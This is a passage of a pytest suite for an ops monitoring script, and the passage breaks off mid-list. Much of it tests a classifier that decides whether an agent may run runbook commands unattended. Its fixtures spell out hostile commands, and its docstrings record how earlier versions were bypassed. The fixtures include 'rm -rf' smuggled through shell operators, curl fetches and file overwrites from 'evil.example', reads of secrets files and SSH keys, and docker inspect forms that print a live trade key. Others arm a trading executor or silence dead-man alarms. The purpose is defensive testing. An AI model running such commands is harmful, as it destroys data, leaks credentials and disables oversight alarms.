"""TDD for `infra/scripts/ops_daily.py` — the daily pass's instrument.

These are standalone scripts, not package modules, so they load via `spec_from_file_location`.
Every fixture here is shaped to what the LIVE Grafana API actually returns, measured 2026-08-29:
the rule uid is a top-level field, `labels` carry only `severity`, and no `__`-prefixed label
exists. An earlier draft of this plan invented `labels.__a_uid__`; the fixtures were shaped to the
invention, so every test passed while the pass would have matched no alert to any runbook.
"""

from __future__ import annotations

import contextlib
import http.client
import importlib.util
import io
import json
import re
import subprocess
import sys
import urllib.error
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

_SCRIPT = Path(__file__).resolve().parents[1] / "infra" / "scripts" / "ops_daily.py"
_spec = importlib.util.spec_from_file_location("ops_daily", _SCRIPT)
ops_daily = importlib.util.module_from_spec(_spec)
sys.modules["ops_daily"] = ops_daily
_spec.loader.exec_module(ops_daily)

NOW = datetime(2026, 8, 29, 12, 0, tzinfo=timezone.utc)
DAY = timedelta(hours=24)


def _canned(*payloads):
    """An opener answering each request in turn, then repeating the last."""
    queue = list(payloads)

    @contextlib.contextmanager
    def opener(request, timeout=None):
        payload = queue.pop(0) if len(queue) > 1 else queue[0]
        yield io.BytesIO(json.dumps(payload).encode())

    return opener


def _recording(*payloads):
    """`_canned`, but it keeps the URLs it was asked for.

    `_canned` never looks at the request, so every endpoint the instrument builds was
    unasserted -- which is how a Prometheus query path shipped against a Loki datasource and
    404'd on the first live run. A test that only feeds a payload back proves parsing and
    nothing about where the payload would have come from.
    """
    urls: list[str] = []
    queue = list(payloads)

    @contextlib.contextmanager
    def opener(request, timeout=None):
        urls.append(request.full_url if hasattr(request, "full_url") else str(request))
        payload = queue.pop(0) if len(queue) > 1 else queue[0]
        yield io.BytesIO(json.dumps(payload).encode())

    opener.urls = urls
    return opener


def _raises(exc):
    @contextlib.contextmanager
    def opener(request, timeout=None):
        raise exc
        yield  # pragma: no cover

    return opener


def _rules(*rules):
    return {"data": {"groups": [{"name": "zcrypto-capture", "rules": list(rules)}]}}


_EMPTY_HISTORY = {"data": {"values": []}}


def test_the_rules_read_pairs_every_firing_instance_with_its_runbook_link():
    payload = _rules(
        {
            "name": "Capture · stream silent",
            "uid": "zcrypto-capture-stream-silent",
            "state": "firing",
            "labels": {"severity": "critical"},
            "annotations": {"summary": "one stream stopped. Runbook: infra/runbooks/capture.md#zcrypto-capture-stream-silent"},
            "alerts": [{"activeAt": "2026-08-29T10:00:00Z", "labels": {"host": "zcrypto"}}],
        },
        {
            "name": "Capture · venue not online",
            "uid": "zcrypto-capture-venue-not-online",
            "state": "inactive",
            "labels": {"severity": "warning"},
            "annotations": {},
            "alerts": [],
        },
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert [a.uid for a in read.firing_now] == ["zcrypto-capture-stream-silent"]
    assert read.firing_now[0].runbook == "infra/runbooks/capture.md#zcrypto-capture-stream-silent"
    assert read.unreadable is None


def test_a_rule_without_a_uid_is_a_finding_never_a_silently_dropped_rule():
    """The uid is how a fired alert reaches its runbook; a shape change that drops it must not read
    as a quiet fleet."""
    payload = _rules({"name": "no uid here", "state": "firing", "labels": {}, "annotations": {}, "alerts": []})
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload))
    assert read.firing_now == []
    assert read.unreadable and "uid" in read.unreadable


def test_a_history_chunk_at_the_page_limit_is_a_finding_not_a_silent_truncation():
    """A chunk returning AT the limit may have dropped transitions, and a report that shows the
    survivors reads as a quiet day."""
    at_limit = {"data": {"values": [["x"] * ops_daily.HISTORY_PAGE_LIMIT]}}
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(_rules(), at_limit))
    assert read.unreadable and "page limit" in read.unreadable


def test_an_unreachable_grafana_is_reported_never_read_as_nothing_firing():
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_raises(urllib.error.URLError("down")))
    assert read.firing_now == [] and read.fired_in_window == []
    assert read.unreadable and "down" in read.unreadable


@pytest.mark.parametrize(
    "uid,expected",
    [
        ("zcrypto-alloy-dark-ops", "ops"),
        ("zcrypto-alloy-dark-nas", "nas"),
        ("zcrypto-alloy-dark-capture-primary", "zcrypto"),
        ("zcrypto-alloy-dark-capture-secondary", "zcrypto-red"),
    ],
)
def test_the_host_is_recovered_from_the_uid_when_the_rule_aggregates_it_away(uid, expected):
    """These rules' own expr is `count(up{host="ops"}) or on() vector(0)`, so the firing instance
    carries only `severity`. Without the map the pass cannot tell an Alloy restart that is routine
    on ops from the same restart on the capture pair, which is attended -- and the two capture
    entries are what a copy-paste breaks."""
    payload = _rules(
        {
            "name": "Alloy dark",
            "uid": uid,
            "state": "firing",
            "labels": {"severity": "critical"},
            "annotations": {},
            "alerts": [{"activeAt": "2026-08-29T10:00:00Z", "labels": {"severity": "critical"}}],
        }
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert read.firing_now[0].host == expected


def test_an_instance_host_label_wins_over_the_uid_map():
    payload = _rules(
        {
            "name": "Alloy dark",
            "uid": "zcrypto-alloy-dark-ops",
            "state": "firing",
            "labels": {"severity": "critical"},
            "annotations": {},
            "alerts": [{"activeAt": "2026-08-29T10:00:00Z", "labels": {"host": "nas"}}],
        }
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert read.firing_now[0].host == "nas"


# --- Task 12 (spec 00104): the log plane -------------------------------------------------------------------


def test_the_loki_uid_defaults_to_the_named_datasource_and_is_overridable():
    """A lookup BY TYPE is the T0034 defect: a Cloud stack ships several Loki datasources, and
    'the first of each type' silently repointed every rule once."""
    assert ops_daily.loki_ds_uid({}) == "grafanacloud-logs"
    assert ops_daily.loki_ds_uid({"GRAFANA_LOKI_DS_UID": "other-loki"}) == "other-loki"


def test_the_log_counts_come_back_by_host_container_and_level():
    payload = {
        "data": {
            "result": [
                {"metric": {"host": "zcrypto", "container": "capture", "level": "ERROR"}, "value": [1, "3"]},
                {"metric": {"host": "ops", "container": "alloy", "level": "WARNING"}, "value": [1, "11"]},
            ]
        }
    }
    read = ops_daily.read_logs("tok", window=DAY, opener=_canned(payload))
    assert (read.counts[0].host, read.counts[0].level, read.counts[0].count) == ("ops", "WARNING", 11)
    assert read.unreadable is None


def test_an_unreachable_loki_is_reported_never_read_as_no_errors():
    read = ops_daily.read_logs("tok", window=DAY, opener=_raises(urllib.error.HTTPError("u", 502, "bad gateway", {}, None)))
    assert read.counts == [] and read.unreadable and "502" in read.unreadable


# --- Task 13 (spec 00104): the dead-men, the fleet verdict, the window's deploys ----------------------------


def test_the_deadmen_are_read_both_through_grafana_and_directly(monkeypatch):
    """The direct read is the domain's whole point: it must answer while Grafana is dark."""
    monkeypatch.setattr(ops_daily, "_readonly_key", lambda: "hcr_fake")
    prom = {"data": {"result": [{"metric": {}, "value": [1, "0"]}]}}
    direct = {"checks": [{"name": "zcrypto-engine-shadow", "status": "up"}]}
    read = ops_daily.read_deadmen("tok", opener=_canned(prom, direct))
    assert read.via_prometheus == 0.0
    assert [c["name"] for c in read.via_healthchecks] == ["zcrypto-engine-shadow"]
    assert read.unreadable is None


def test_a_missing_readonly_key_is_named_never_silently_skipped(monkeypatch):
    monkeypatch.setattr(ops_daily, "_readonly_key", lambda: None)
    read = ops_daily.read_deadmen("tok", opener=_canned({"data": {"result": []}}))
    assert read.unreadable and "healthchecks_readonly_api_key" in read.unreadable


def test_no_series_is_a_verdict_failure_never_a_pass():
    """`ops-postverify.sh`'s rule, carried into the fleet checks: an empty query is not a zero."""
    checks = ops_daily.read_verdict("tok", opener=_canned({"data": {"result": []}}))
    assert checks and all(not c.ok for c in checks)
    assert all(c.value == "(no series)" for c in checks)


def test_the_deploy_window_holds_only_lines_inside_it(tmp_path):
    log = tmp_path / "deploy-log.jsonl"
    log.write_text(
        '{"ts": "2026-08-29T11:00:00Z", "playbook": "site.yml", "limit": "ops"}\n'
        '{"ts": "2026-08-20T11:00:00Z", "playbook": "site.yml", "limit": "nas"}\n'
        "\n"
        "not json\n"
    )
    lines = ops_daily.read_deploys(DAY, now=NOW, path=log)
    assert [d["limit"] for d in lines] == ["ops"]


# --- Task 14 (spec 00104): the report, the exit codes -------------------------------------------------------


def _report(**kw):
    base = dict(
        alerts=ops_daily.AlertsRead(),
        logs=ops_daily.LogsRead(),
        deadmen=ops_daily.DeadmenRead(via_prometheus=0.0, via_healthchecks=[{"name": "x"}]),
        verdict=[ops_daily.Check("capture primary up", "up{...}", ok=True, value="1")],
        deploys=[],
        now=NOW,
    )
    return ops_daily.build_report(**{**base, **kw})


def test_an_all_clear_report_exits_zero():
    r = _report()
    assert r.exit_code == 0 and r.verdict_word == "all-clear"


def test_anything_fired_exits_one():
    firing = ops_daily.AlertsRead(firing_now=[ops_daily.Alert("u", "t", "firing", None, None, "ops")])
    assert _report(alerts=firing).exit_code == 1


def test_a_failed_fleet_check_exits_one():
    failed = [ops_daily.Check("capture primary up", "up{...}", ok=False, value="(no series)")]
    assert _report(verdict=failed).exit_code == 1


def test_a_source_the_instrument_could_not_read_exits_two_and_names_it():
    """A source it cannot reach is a finding ABOUT that source, never a silent gap."""
    r = _report(alerts=ops_daily.AlertsRead(unreadable="rules API 502"))
    assert r.exit_code == 2 and "rules API 502" in r.markdown()


def test_unreadable_outranks_fired_so_a_partial_read_is_never_reported_as_attention_only():
    firing = ops_daily.AlertsRead(
        firing_now=[ops_daily.Alert("u", "t", "firing", None, None, "ops")], unreadable="history truncated"
    )
    assert _report(alerts=firing).exit_code == 2


def test_the_journal_paragraph_carries_every_labelled_clause():
    para = _report().journal_paragraph()
    for clause in ("window", "alerts", "checks", "logs", "dead-men", "deploys", "actions", "follow-ups"):
        assert clause in para, f"missing clause: {clause}"


def test_the_cli_refuses_an_unknown_subcommand():
    assert ops_daily.main([]) == 2
    assert ops_daily.main(["frobnicate"]) == 2


# --- Task 15b (spec 00104): the tier classifier -------------------------------------------------------------

# infra/runbooks/observability.md, the alloy-dark section -- one body serving nas, ops AND both
# capture hosts, which is why the host is an argument and not read out of the step.
_ALLOY_RESTART = "Restart it — safe, and the usual fix: `sudo docker restart grafana-alloy`."


@pytest.mark.parametrize(
    "host,expected",
    [
        ("ops", ops_daily.Tier.AUTONOMOUS),
        ("nas", ops_daily.Tier.AUTONOMOUS),
        ("zcrypto", ops_daily.Tier.PREPARED),
        ("zcrypto-red", ops_daily.Tier.PREPARED),
        (None, ops_daily.Tier.PREPARED),
    ],
)
def test_the_same_step_is_routine_on_ops_and_attended_on_the_capture_pair(host, expected):
    """Identical text; only the host differs. A classifier reading the text alone must get one of
    these wrong, and the wrong one restarts Alloy on the capture primary unattended."""
    assert ops_daily.classify_action(_ALLOY_RESTART, host=host) is expected


@pytest.mark.parametrize(
    "text",
    [
        'Read the ladder: `sudo docker logs zcrypto-capture 2>&1 | grep -E "checksum desync"`.',
        "`uv run python infra/scripts/grafana-query.py 'zcrypto_capture_book_desynced'`",
        "**Engine-side**: `sudo docker inspect --format '{{.State.Status}} {{.RestartCount}}' zcrypto-engine`",
        "**Prove the prune ring is alive**: `systemctl list-timers 'zcrypto-*'` and `journalctl -u zcrypto-capture-prune -n 3 --no-pager`",
        "Read the engine's gate: `sudo docker exec zcrypto-engine zcrypto engine exec-status`.",
        "`sudo docker logs zcrypto-capture --since 1h 2>&1 | tail -50`",
        "`df -h /` then `sudo du -xsh /var/lib/zcrypto-capture/* | sort -h`",
    ],
)
def test_a_read_only_step_is_autonomous_even_naming_a_protected_object(text):
    """Seven read verbs: a suite exercising two lets a classifier keyed on those two prepare every
    logs, grep and journalctl step -- the halt-at-step-1 failure in a new place."""
    assert ops_daily.classify_action(text, host="zcrypto") is ops_daily.Tier.AUTONOMOUS


@pytest.mark.parametrize(
    "text",
    [
        "On the named host: `sudo systemctl restart zcrypto-capture`.",
        "Stop the daemon, then read its logs: `sudo systemctl stop zcrypto-capture`.",
        "Restart the engine: `sudo systemctl restart zcrypto-engine`.",
        "Clear the kill file: `sudo rm /var/lib/zcrypto-engine/exec/kill`.",
        "Push the rules: `bash infra/scripts/grafana-push.sh`.",
        "Converge: `infra/ansible/scripts/converge.sh site.yml --limit zcrypto-red`.",
        "**The systemd journal**: `sudo journalctl --vacuum-size=200M`.",
        "`sudo docker exec zcrypto-engine zcrypto engine cycle --at 2026-08-29T12:00:00+00:00 --replace`",
        # ONE span, so the docker-exec payload is what decides: a two-span fixture would fail on the
        # `ssh nas` span instead and pass for the wrong reason. Under the unsafe invention -- allowlist
        # (docker, exec) and skip the stripping -- this is the case that comes back autonomous.
        "`sudo /usr/local/bin/docker exec zcrypto-archive-pull rm /tmp/gate-cache.json`",
        "`ssh nas`, then `sudo /usr/local/bin/docker exec zcrypto-archive-pull rm /tmp/gate-cache.json`",
        "`sudo docker inspect zcrypto-engine`",
    ],
)
def test_a_mutating_or_unscoped_step_is_prepared_on_any_host(text):
    """The dangerous half, pinned by name -- a pair of fixtures cannot reach it. The last case is
    an UNSCOPED inspect: it prints the container's environment, which on the engine host is the
    live trade key."""
    assert ops_daily.classify_action(text, host="ops") is ops_daily.Tier.PREPARED


def test_a_bare_command_with_no_backticks_is_judged_as_one_command():
    """Every other fixture carries backticks, so "no span => PREPARED" would pass the whole suite
    and then prepare everything at runtime -- the skill passes the command bare."""
    assert ops_daily.classify_action("sudo docker logs zcrypto-capture --since 1h", host="zcrypto") is ops_daily.Tier.AUTONOMOUS


def test_an_unrecognised_action_is_prepared_never_autonomous():
    assert ops_daily.classify_action("Frobnicate the widget.", host="ops") is ops_daily.Tier.PREPARED


_RUNBOOKS = Path(__file__).resolve().parents[1] / "infra/runbooks"
_DESTRUCTIVE = (
    "--replace",
    "--vacuum",
    "--apply",
    "--prune",
    "--force",
    " rm ",
    "systemctl stop",
    "systemctl restart",
    "docker restart",
    "docker stop",
    "docker rm",
    "converge.sh",
    # Destructive OR banned: a command CLAUDE.md forbids (an unscoped inspect, `docker exec … env`,
    # `docker compose config` -- each prints the container environment, and on the engine host that
    # is the live trade key) is not a read-only diagnostic either; counting it as one would make the
    # floor below measure something other than what it claims.
    "compose down",
    "compose up",
    "compose restart",
    "compose config",
    "docker run",
    "system prune",
    "image prune",
    "exec … env",
    # `{{json .Config}}` exactly -- NOT a prefix: `{{json .Config.Entrypoint}}` is on CLAUDE.md's
    # allowed list, and a prefix token would call a correct classification an offender.
    "{{json .Config}}",
    ".Config.Env",
)


def _runbook_commands() -> list[str]:
    """Every backtick span AND every fenced-block line that parses as a command.

    The fenced blocks matter: engine.md's `cycle --at … --replace` lives in one, and a
    backtick-only sweep never sees it.
    """
    out, starters = (
        [],
        (
            "sudo ",
            "ssh ",
            "uv run ",
            "bash ",
            "docker ",
            "systemctl ",
            "journalctl ",
            "df ",
            "du ",
            "find ",
            "cat ",
            "grep ",
            "ls ",
            "curl ",
            "stat ",
        ),
    )
    for path in sorted(_RUNBOOKS.glob("*.md")):
        text = path.read_text()
        out += [s.strip() for s in re.findall(r"`([^`\n]+)`", text)]
        fenced, lines = False, text.splitlines()
        for line in lines:
            if line.strip().startswith("```"):
                fenced = not fenced
                continue
            if fenced or line.startswith("    "):
                out.append(line.strip())
    return [c for c in {c for c in out if c} if c.startswith(starters)]


def test_no_runbook_command_carrying_a_destructive_token_is_ever_autonomous():
    """The guard against the verb nobody imagined: it does not matter WHICH allowlist entry lets a
    command through, only that nothing destructive does. Both Criticals this classifier has already
    had -- `journalctl --vacuum-size`, `docker exec … cycle --replace` -- fail this test."""
    offenders = [
        c
        for c in _runbook_commands()
        if any(tok in c for tok in _DESTRUCTIVE)
        and ops_daily.classify_action(f"`{c}`", host="zcrypto") is ops_daily.Tier.AUTONOMOUS
    ]
    assert not offenders, f"destructive commands classified autonomous: {offenders}"


def test_most_read_only_diagnostics_are_autonomous_on_ops():
    """The opposite failure: an allowlist so narrow the pass refuses its own diagnostics has moved
    halt-at-step-1 rather than fixed it. Close a red here by WIDENING the allowlist with
    corpus-justified read heads, never by narrowing the extraction -- that games a safety floor by
    shrinking its denominator."""
    reads = [c for c in _runbook_commands() if not any(tok in c for tok in _DESTRUCTIVE)]
    autonomous = [c for c in reads if ops_daily.classify_action(f"`{c}`", host="ops") is ops_daily.Tier.AUTONOMOUS]
    assert len(autonomous) / len(reads) >= 0.70, (
        f"only {len(autonomous)}/{len(reads)} read-only diagnostics classify autonomous; "
        f"refused sample: {sorted(c for c in reads if c not in autonomous)[:12]}"
    )


def test_the_classify_subcommand_is_what_the_skill_calls(capsys):
    """The skill branches on this exit code. An incantation nobody runs is how a procedure's first
    instruction silently rots -- this one did not exist until the plan's smoke step ran it."""
    assert ops_daily.main(["classify", "--host", "ops", _ALLOY_RESTART]) == 0
    assert capsys.readouterr().out.strip() == "autonomous"
    assert ops_daily.main(["classify", "--host", "zcrypto", _ALLOY_RESTART]) == 3
    assert capsys.readouterr().out.strip() == "prepared"


def test_classify_without_a_host_prepares():
    """Not knowing where an action lands is not permission to run it."""
    assert ops_daily.main(["classify", _ALLOY_RESTART]) == 3


def test_the_cli_names_both_subcommands_when_misused(capsys):
    assert ops_daily.main(["frobnicate"]) == 2
    assert "classify" in capsys.readouterr().out


@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/foo ; rm -rf /var/lib/zcrypto-engine/store",
        "docker logs zcrypto-capture; sudo systemctl restart zcrypto-capture",
        "docker logs zcrypto-capture & rm -rf /var/lib/zcrypto-capture",
        "echo $(sudo systemctl restart zcrypto-engine)",
        "echo 1 > /var/lib/zcrypto-engine/exec/armed",
        "echo 1 > /var/lib/zcrypto-engine/exec/kill",
        "curl -X DELETE https://healthchecks.io/api/v3/checks/abc",
        "curl -X POST https://example.invalid/api/annotations -d '{}'",
        "curl https://hc-ping.com/some-uuid",
        "docker inspect --format '{{json .Config}}' zcrypto-engine",
        "docker inspect --format '{{.Config.Env}}' zcrypto-engine",
        "docker inspect zcrypto-engine",
    ],
)
def test_shell_composition_and_write_shaped_reads_are_never_autonomous(cmd):
    """Every one of these classified AUTONOMOUS before the whole-branch review, and each is a real
    escape route rather than a hypothetical: a redirect into `exec/armed` ARMS the live venue
    executor; a GET to a ping URL marks a dead-man alive, silencing the alarm; `{{json .Config}}`
    prints the container's environment, which on the engine host is the Kraken trade key. The corpus
    test cannot reach any of them -- no runbook contains a composition attack -- so they are pinned
    here by construction."""
    assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED


@pytest.mark.parametrize(
    "cmd",
    [
        # Operator SPELLINGS. `shlex(punctuation_chars=True)` emits each run of `();<>|&` as one
        # token, and the parser generation denylisted five of them: `|&` pipes stdout+stderr and
        # RUNS the second command, and all three `&>` forms redirect. Verified in real bash --
        # `echo x |& rm -rf …` deleted the marker while the classifier called it a read.
        "echo pwned |& rm -rf /tmp/probe_target",
        "echo x |& rm -rf /var/lib/zcrypto-capture",
        "echo x |& sudo systemctl restart zcrypto-engine",
        "echo pwned >& /tmp/probe_redir_both",
        "echo pwned &> /tmp/probe_amp_redir",
        "echo pwned &>> /tmp/probe_amp_append",
        "cat /etc/hostname ;; rm -rf /tmp/x",
        # Writes through an OPERAND, not a verb: `sort -o FILE` writes FILE, and uniq's second
        # positional is its output file -- with no flag at all. These are why the flag-allowlist
        # design was abandoned: no list of flags can catch a filename that is one by position.
        "sort -o /tmp/probe_sort_out /etc/hostname",
        "uniq /etc/hostname /tmp/probe_uniq_out",
        "cat /etc/hostname | tee /tmp/probe_tee",
        # journalctl's maintenance writes, beside the `--vacuum-size` that was an earlier Critical.
        "journalctl --update-catalog",
        "journalctl --sync",
        "journalctl --relinquish-var",
        # `date -s` sets the system clock, and the runbooks sudo.
        "date -s '2020-01-01 00:00:00'",
        "date --set=2020-01-01",
    ],
)
def test_the_round_three_escapes_are_refused(cmd):
    """Each string here was AUTONOMOUS under the parser and mutates in real bash.

    They are the reason the parser was replaced by an enumerated allowlist: three rounds each closed
    one class and shipped the next. A shape absent from the table refuses by construction, so these
    pass without anyone having imagined the verb -- but they are kept as fixtures because a guard is
    unproven until the defect it names is seen to trip it.
    """
    for host in ("zcrypto", "ops", "nas"):
        assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.PREPARED, host


@pytest.mark.parametrize(
    "cmd,host",
    [
        ("sudo /usr/local/bin/docker logs --since 3h zcrypto-archive-pull | tail -50", "nas"),
        ("sudo docker inspect grafana-alloy --format '{{.State.Status}} {{.RestartCount}} {{.State.OOMKilled}}'", "ops"),
        ("sudo docker exec zcrypto-engine zcrypto engine exec-status", "zcrypto"),
        ("uv run python infra/scripts/grafana-query.py 'up{job=\"capture_app\"}'", "ops"),
        ("sudo docker logs --since 5h zcrypto-engine | grep 'not scored'", "zcrypto"),
    ],
)
def test_the_wrappers_and_quoting_the_runbooks_really_use(cmd, host):
    """The false-refusal side of the rewrite, at the four places it nearly broke.

    The NAS spells docker `/usr/local/bin/docker`; a `--format` body and a grep pattern hold spaces,
    so a stage must be tokenised quote-aware or it splits into nonsense; `docker exec <container>`
    fronts a genuine read; and the repo's own query script takes PromQL full of braces and quotes.
    """
    assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.AUTONOMOUS


def test_a_peeled_docker_exec_payload_is_re_examined_never_trusted():
    """`docker exec` is peeled so its payload can be judged -- the peel must not BE the judgement.

    Same container, same wrapper, opposite verdicts: only the payload separates them."""
    assert (
        ops_daily.classify_action("sudo docker exec zcrypto-engine zcrypto engine exec-status", host="zcrypto")
        is ops_daily.Tier.AUTONOMOUS
    )
    assert (
        ops_daily.classify_action("sudo docker exec zcrypto-archive-pull rm -f /tmp/gate-cache.json", host="nas")
        is ops_daily.Tier.PREPARED
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "sudo docker logs grafana-alloy --since 1h 2>&1 | grep -iE 'collector|error'",
        "sudo docker logs zcrypto-capture 2>&1 | grep -E 'checksum desync|desync recovery'",
        "sudo docker inspect --format '{{.State.Status}} {{.RestartCount}}' zcrypto-engine",
        "curl -fsS http://127.0.0.1:12345/metrics",
    ],
)
def test_the_true_positives_still_pass(cmd):
    """The other half of the bargain: a guard that refuses everything is not a guard, it is an
    outage. A quoted pipe is data, not composition."""
    assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.AUTONOMOUS


def test_an_alert_that_fired_and_resolved_overnight_reaches_the_report():
    """The daily pass's core case, and it was silently missing: history rows were fetched and
    discarded, so `fired_in_window` was a copy of `firing_now` and an alert that fired at 02:00 and
    cleared at 03:00 never reached the report, the runbook loop, or the journal. The frame's shape
    is measured against the live API: three columns named by `schema.fields`, the rule identity in
    `line`, never in `labels`."""
    rules = _rules(
        {
            "name": "Capture · stream silent",
            "uid": "zcrypto-capture-stream-silent",
            "state": "inactive",
            "labels": {"severity": "critical"},
            "annotations": {"summary": "Runbook: infra/runbooks/capture.md#zcrypto-capture-stream-silent"},
            "alerts": [],
        }
    )
    history = {
        "schema": {"fields": [{"name": "time"}, {"name": "line"}, {"name": "labels"}]},
        "data": {
            "values": [
                [1787987260000, 1787990860000],
                [
                    {
                        "previous": "Pending",
                        "current": "Alerting",
                        "ruleUID": "zcrypto-capture-stream-silent",
                        "ruleTitle": "Capture · stream silent",
                    },
                    {
                        "previous": "Alerting",
                        "current": "Normal",
                        "ruleUID": "zcrypto-capture-stream-silent",
                        "ruleTitle": "Capture · stream silent",
                    },
                ],
                [{}, {}],
            ]
        },
    }
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(rules, history))
    assert read.firing_now == [], "it is not firing now -- that is the point"
    assert [a.uid for a in read.fired_in_window] == ["zcrypto-capture-stream-silent"]
    assert read.fired_in_window[0].runbook == "infra/runbooks/capture.md#zcrypto-capture-stream-silent"


@pytest.mark.parametrize(
    "cmd",
    [
        # Attached and combined short flags: curl accepts every one of these.
        "curl -XDELETE https://healthchecks.io/api/v3/checks/abc",
        "curl -XPOST https://x/api",
        "curl -d{} https://x/api",
        "curl -T/etc/hosts https://x/up",
        "curl -sO https://x/payload",
        # `-o /dev/null` first, so a scan that stops at the first output flag never sees the -X.
        "curl -fsS -o /dev/null -X DELETE https://healthchecks.io/api/v3/checks/abc",
        # DNS is case-insensitive; the ping check must be too.
        "curl https://HC-PING.com/uuid",
        # An interpreter that can shell out, with no redirect for composition to catch.
        "awk 'BEGIN{system(\"rm -rf /tmp/x\")}'",
        # find's siblings of -exec and -delete.
        r"find /var/log -execdir rm -rf {} \;",
        "find / -fprint /var/lib/foo/marker",
        # A backslash-escaped quote: a naive scanner opens a quote span here and treats the real `;`
        # as data. Verified against bash -- the `rm` runs.
        "echo \\' ; rm -rf /var/lib/foo",
        "echo \\' & rm -rf /var/lib/foo",
        # An unbalanced quote: bash refuses it, and so must the classifier rather than parsing on.
        'echo "a ; rm -rf /var/lib/foo',
    ],
)
def test_flag_syntax_interpreters_and_escapes_cannot_launder_a_mutation(cmd):
    """Thirteen strings that classified AUTONOMOUS after the first composition fix. Each is a real
    escape route, and together they are why the flag lists are ALLOWLISTS per command and the lexer
    is `shlex` rather than hand-rolled: a denylist of flags misses the attached form, and a
    hand-rolled scanner loses to a backslash."""
    assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED


@pytest.mark.parametrize(
    "cmd,host",
    [
        ("curl -fsS -m 10 -o /dev/null -w '%{http_code}' https://healthchecks.io/", "ops"),
        ("curl -s http://127.0.0.1:12345/metrics", "ops"),
        ("find /var/lib/zcrypto-capture -name '*.parquet' -mmin -3 -ls", "zcrypto"),
        ("sudo docker exec zcrypto-engine zcrypto engine exec-status", "zcrypto"),
    ],
)
def test_the_real_reads_survive_the_allowlists(cmd, host):
    """The allowlists must still admit the runbooks' own GETs and finds -- a guard that refuses
    everything has moved the outage, not removed it."""
    assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.AUTONOMOUS


@pytest.mark.parametrize(
    "cmd",
    [
        # `curl -o` WRITES the file it names. Verified: the admitted string overwrote a seeded
        # marker with example.com's HTML. It sat on the read path, which returns AUTONOMOUS before
        # the protected-object veto runs -- so naming the unbackfillable capture dir did not stop it.
        "curl -o /var/lib/zcrypto-capture/x.parquet https://evil.example/p",
        "sudo curl -fsS -o /etc/zcrypto/zcrypto.toml https://evil.example/cfg",
        "curl -O https://evil.example/payload",
        "curl --output /tmp/x https://evil.example/p",
        # A Go template reaches the WHOLE object through a bare root reference, so allowlisting the
        # selectors a format mentions is unsound: `{{.Name}}` is safe and `{{json .}}` beside it
        # marshals ContainerJSON. Verified against a container carrying a fake key -- it printed it.
        "docker inspect --format '{{.Name}}{{json .}}' zcrypto-engine",
        'docker inspect --format \'{{.Id}}{{index . "Config" "Env"}}\' zcrypto-engine',
        "docker inspect --format '{{json .}}' zcrypto-engine",
        "docker inspect --format='{{.Name}}{{json .}}' zcrypto-engine",
        "docker inspect -f '{{.Name}}{{json .}}' zcrypto-engine",
        "docker inspect --format '{{range .Config.Env}}{{.}}{{end}}' zcrypto-engine",
        # The classifier used to disagree with bash here: a raw replace turned this into
        # `docker logs zcrypto-engine`, while bash reads a command `logs2` redirecting to a file.
        "docker logs2>/dev/nullzcrypto-engine",
        # A read that surfaces the trade key is the same defect `docker inspect` is guarded against.
        "cat /opt/zcrypto-capture/logship-secrets.env",
        "sudo cat /etc/zcrypto/secrets.env",
        "grep -r KRAKEN /opt/zcrypto-capture/logship-secrets.env",
        "cat infra/ansible/group_vars/all/vault.yml",
        # Round five. The name-matching version of this veto passed every string above and still
        # printed the Loki push password, because a glob and a directory carry no secret-shaped
        # token -- the danger arrives through what the filter cannot name. These are the forms that
        # matter; the literal-filename ones above never exercised the hole.
        "sudo cat /opt/zcrypto-capture/*",
        "sudo cat /etc/zcrypto-ops/alloy/*",
        "cat /home/deploy/.ssh/*",
        "grep -rF LOKI /etc/zcrypto-ops/",
        "grep -r . /home/deploy/.ssh/",
        "cat /var/log/../opt/zcrypto-capture/logship-secrets.env",
    ],
)
def test_the_round_four_escapes_are_refused(cmd):
    """Both Criticals here lived in post-checks CARRIED OVER from the parser, not in the new table.

    That is the lesson worth keeping: the enumerated shapes held under attack, and the two hand-written
    predicates bolted onto them did not. A post-check that reasons about a command's arguments is the
    old design surviving inside the new one, and it failed the same way -- by allowlisting what it
    could name while the danger arrived through something it could not.
    """
    for host in ("zcrypto", "ops", "nas"):
        assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.PREPARED, host


@pytest.mark.parametrize(
    "cmd,host",
    [
        ("curl -fsS -m 10 -o /dev/null -w '%{http_code}\\n' https://healthchecks.io/", "ops"),
        ("sudo docker inspect grafana-alloy --format '{{json .Mounts}}'", "ops"),
        (
            "sudo docker inspect zcrypto-ops-liquidations --format '{{.State.Status}} {{.RestartCount}} {{json .Config.Entrypoint}}'",
            "ops",
        ),
        (
            "sudo docker inspect grafana-alloy --format 'img={{.Config.Image}} restarts={{.RestartCount}} started={{.State.StartedAt}} oom={{.State.OOMKilled}}'",
            "ops",
        ),
        ("sudo ls -la /opt/zcrypto-capture/logship-secrets.env", "zcrypto"),
        ("sha256sum /etc/zcrypto-capture/alloy/conf/config.alloy", "zcrypto"),
        ("cat /var/lib/zcrypto-node-textfile/*.prom", "ops"),
        ("grep -rE '^Storage=' /etc/systemd/journald.conf /etc/systemd/journald.conf.d/", "ops"),
        ("sudo cat /var/lib/zcrypto-engine/exec/kill", "zcrypto"),
        ("cat /mnt/zhao-crypto/.pull-status", "nas"),
        ("grep -A3 group_add /etc/zcrypto-ops/alloy/compose.yaml", "ops"),
        ("sudo docker inspect zcrypto-capture --format 'cpus={{.HostConfig.NanoCpus}} mem={{.HostConfig.Memory}}'", "zcrypto"),
